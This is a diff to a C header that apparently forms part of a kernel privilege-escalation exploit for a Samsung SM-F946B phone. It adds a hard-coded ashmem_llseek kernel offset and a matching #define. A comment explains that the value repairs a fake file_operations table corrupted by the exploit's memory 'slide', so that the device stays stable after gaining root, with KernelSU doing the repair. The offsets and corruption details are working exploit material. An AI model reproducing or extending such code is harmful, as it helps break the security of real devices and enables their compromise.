@@ -537,6 +537,19 @@
 #define CORE_PATTERN (KIMAGE_TEXT_BASE + CORE_PATTERN_OFF)
 #define ASHMEM_IOCTL_OFF          0x0114c6dcULL
 #define ASHMEM_COMPAT_IOCTL_OFF   0x0114cd38ULL
+/* ashmem_llseek, resolved EXACT (kallsyms nearest-below +0) on the GZH2 factory
+ * Image and confirmed in Samsung's own source
+ * (SM-F946B_16_Opensource .../drivers/staging/android/ashmem.c:926
+ * `.llseek = ashmem_llseek`, which delegates to the backing tmpfs file, i.e.
+ * the standard ASharedMemory_getSize lseek(fd,0,SEEK_END) path). Needed as the
+ * repair value for the fake table's llseek slot: the slide unavoidably clobbers
+ * fake+8 with the misc_fops slot address (non-executable .data), and the first
+ * post-root lseek on an ashmem fd then IABTs (proven 2026-10-11: pc =
+ * ashmem_misc+0x10 from __arm64_sys_lseek, binder thread, IME bringup). The
+ * payload itself cannot plant this (configfs writer is .data-only, the slide
+ * only writes data pointers); the KSU module init performs the repair with a
+ * plain kernel write (see kernelsu compat/samsung_ashmem.c). */
+#define ASHMEM_LLSEEK_OFF         0x0114c53cULL
 #define ASHMEM_MMAP_OFF           0x0114cd90ULL
 #define ASHMEM_OPEN_OFF           0x0114d070ULL
 #define ASHMEM_RELEASE_OFF        0x0114d108ULL
@@ -550,6 +563,7 @@
 #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
 #define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
 #define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
+#define ASHMEM_LLSEEK (KIMAGE_TEXT_BASE + ASHMEM_LLSEEK_OFF)
 #define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
 #define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
 #define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
